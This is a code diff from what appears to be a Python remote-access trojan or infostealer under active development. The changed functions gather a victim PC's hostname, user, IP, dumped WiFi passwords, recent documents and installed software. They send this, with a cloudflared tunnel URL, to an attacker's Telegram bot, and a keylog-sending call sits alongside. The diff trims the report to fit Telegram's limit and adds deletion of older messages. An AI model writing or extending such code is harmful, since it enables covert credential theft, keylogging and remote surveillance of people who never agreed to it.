@@ -283,7 +283,7 @@ def _save_telegram_state(state: dict):
         pass
 
 def _build_pc_status_text(cloudflared_url: str, status: str = "🟢 Active") -> str:
-    """Build the status message text for this PC."""
+    """Build the status message text for this PC. Truncated to fit Telegram 4096 char limit."""
     hostname = socket.gethostname()
     username = os.environ.get('USERNAME', 'Unknown')
     host_ip = "Unknown"
@@ -300,37 +300,53 @@ def _build_pc_status_text(cloudflared_url: str, status: str = "🟢 Active") -> 
     os_info = f"{_pf.system()} {_pf.release()}"
     now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    wifi_pwds = _dump_wifi_passwords()
-    wifi_text = "\n".join(wifi_pwds[:8]) if wifi_pwds else "None found"
-
-    recent = _get_recent_documents()
-    recent_text = "\n".join(recent[:8]) if recent else "None found"
-
-    installed = _get_installed_software()
-    installed_text = "\n".join(installed[:10]) if installed else "None found"
-
-    return f"""<b>{status} | {hostname}</b>
-
+    header = f"""<b>{status} | {hostname}</b>
 <b>User:</b> {username} | <b>IP:</b> {host_ip}
 <b>OS:</b> {os_info}
 <b>Dashboard:</b> {cloudflared_url or 'N/A'}
-<b>Last Seen:</b> {now_str}
+<b>Last Seen:</b> {now_str}"""
 
-<b>WiFi Passwords:</b>
-<pre>{wifi_text}</pre>
+    wifi_pwds = _dump_wifi_passwords()
+    wifi_text = ", ".join(wifi_pwds[:5]) if wifi_pwds else "None"
 
-<b>Recent Docs:</b>
-<pre>{recent_text}</pre>
+    recent = _get_recent_documents()
+    recent_text = ", ".join(recent[:5]) if recent else "None"
 
-<b>Software:</b>
-<pre>{installed_text}</pre>"""
+    installed = _get_installed_software()
+    installed_text = ", ".join(installed[:5]) if installed else "None"
+
+    body = f"""
+
+<b>WiFi:</b> {wifi_text}
+<b>Recent:</b> {recent_text}
+<b>Software:</b> {installed_text}"""
+
+    result = header + body
+    if len(result) > 4000:
+        result = header + f"\n\n<b>WiFi:</b> {wifi_text[:200]}"
+    if len(result) > 4000:
+        result = header
+    return result
+
+def _delete_telegram_message(message_id: str) -> bool:
+    """Delete a Telegram message by message_id."""
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id}
+        resp = requests.post(url, json=payload, timeout=15)
+        return resp.status_code == 200
+    except:
+        return False
 
 def _send_telegram_full_report(cloudflared_url: str) -> bool:
     """Send or update PC status message on Telegram. One message per PC, edited on reconnect."""
     try:
         state = _load_telegram_state()
         msg_text = _build_pc_status_text(cloudflared_url, "🟢 Active")
-        pc_msg_id = state.get(_PC_ID, {}).get("message_id", "")
+        pc_data = state.get(_PC_ID, {})
+        pc_msg_id = pc_data.get("message_id", "")
 
         if pc_msg_id:
             edited = _edit_telegram(pc_msg_id, msg_text)
@@ -340,6 +356,7 @@ def _send_telegram_full_report(cloudflared_url: str) -> bool:
                 _save_telegram_state(state)
                 _send_keylog_to_telegram()
                 return True
+            _delete_telegram_message(pc_msg_id)
 
         msg_id = _send_telegram_get_id(msg_text)
         if msg_id:
